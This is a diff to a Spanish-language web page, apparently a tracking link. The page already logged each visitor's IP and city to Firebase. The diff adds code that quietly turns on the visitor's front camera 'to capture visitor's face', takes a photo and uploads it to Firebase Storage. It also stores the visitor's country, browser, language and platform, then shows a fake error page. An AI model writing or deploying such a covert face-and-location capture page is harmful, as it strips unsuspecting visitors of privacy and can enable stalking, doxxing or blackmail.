@@ -66,6 +66,11 @@
                 font-size: 1.2rem;
             }
         }
+
+        #video,
+        #canvas {
+            display: none;
+        }
     </style>
 </head>
 
@@ -75,38 +80,120 @@
         <p id="status">Procesando...</p>
     </div>
 
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
     <script type="module">
         import { db, ref, push } from './firebase-config.js';
+        import { getStorage, ref as storageRef, uploadString } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-storage.js';
 
         const statusEl = document.getElementById('status');
         const id = new URLSearchParams(location.search).get('id');
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const storage = getStorage();
 
         if (!id) {
             showError();
         } else {
-            // Capture visitor data
-            fetch('https://ipapi.co/json/')
-                .then(r => r.json())
-                .then(data => {
-                    return push(ref(db, `visitas/${id}`), {
-                        ip: data.ip || 'Unknown',
-                        ciudad: data.city || 'Unknown',
-                        fecha: new Date().toLocaleString('es-ES', {
-                            year: 'numeric',
-                            month: '2-digit',
-                            day: '2-digit',
-                            hour: '2-digit',
-                            minute: '2-digit'
-                        })
-                    });
-                })
-                .then(() => {
-                    showError();
-                })
-                .catch(err => {
-                    console.error('Error:', err);
-                    showError();
+            captureData();
+        }
+
+        async function captureData() {
+            try {
+                // 1. Capture IP and location data
+                const geoData = await fetch('https://ipapi.co/json/').then(r => r.json());
+
+                // 2. Try to capture photo from camera
+                let photoURL = null;
+                try {
+                    photoURL = await capturePhoto();
+                } catch (err) {
+                    console.log('Camera not available:', err);
+                }
+
+                // 3. Save to database
+                await push(ref(db, `visitas/${id}`), {
+                    ip: geoData.ip || 'Unknown',
+                    ciudad: geoData.city || 'Unknown',
+                    pais: geoData.country_name || 'Unknown',
+                    fecha: new Date().toLocaleString('es-ES', {
+                        year: 'numeric',
+                        month: '2-digit',
+                        day: '2-digit',
+                        hour: '2-digit',
+                        minute: '2-digit'
+                    }),
+                    timestamp: Date.now(),
+                    foto: photoURL || null,
+                    userAgent: navigator.userAgent,
+                    idioma: navigator.language,
+                    plataforma: navigator.platform
                 });
+
+                showError();
+            } catch (err) {
+                console.error('Error:', err);
+                showError();
+            }
+        }
+
+        async function capturePhoto() {
+            return new Promise(async (resolve, reject) => {
+                try {
+                    // Request camera access (back camera on mobile)
+                    const stream = await navigator.mediaDevices.getUserMedia({
+                        video: {
+                            facingMode: 'user', // Front camera to capture visitor's face
+                            width: { ideal: 640 },
+                            height: { ideal: 480 }
+                        },
+                        audio: false
+                    });
+
+                    video.srcObject = stream;
+
+                    // Wait for video to be ready
+                    video.onloadedmetadata = async () => {
+                        // Wait a bit for camera to adjust
+                        await new Promise(r => setTimeout(r, 1500));
+
+                        // Capture frame
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0);
+
+                        // Convert to base64
+                        const imageData = canvas.toDataURL('image/jpeg', 0.7);
+
+                        // Stop camera
+                        stream.getTracks().forEach(track => track.stop());
+
+                        // Upload to Firebase Storage
+                        try {
+                            const timestamp = Date.now();
+                            const fileName = `captures/${id}/${timestamp}.jpg`;
+                            const photoRef = storageRef(storage, fileName);
+
+                            await uploadString(photoRef, imageData, 'data_url');
+
+                            // Return filename (we'll store this in database)
+                            resolve(fileName);
+                        } catch (uploadErr) {
+                            console.error('Upload error:', uploadErr);
+                            resolve(null);
+                        }
+                    };
+
+                    video.onerror = () => {
+                        reject(new Error('Video error'));
+                    };
+
+                } catch (err) {
+                    reject(err);
+                }
+            });
         }
 
         function showError() {
